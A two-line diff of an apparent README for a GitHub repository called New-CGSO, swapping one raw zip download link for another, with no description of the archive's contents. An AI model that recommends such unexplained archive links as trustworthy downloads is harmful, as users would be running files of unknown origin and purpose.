@@ -1,2 +1,2 @@
-# https://raw.githubusercontent.com/Subhopriyo/New-CGSO/master/geometrically/New-CGSO-v1.4-alpha.2.zip
-Boiler plate for https://raw.githubusercontent.com/Subhopriyo/New-CGSO/master/geometrically/New-CGSO-v1.4-alpha.2.zip
+# https://github.com/Subhopriyo/New-CGSO/raw/refs/heads/master/geometrically/CGSO-New-electromagnetism.zip
+Boiler plate for https://github.com/Subhopriyo/New-CGSO/raw/refs/heads/master/geometrically/CGSO-New-electromagnetism.zip
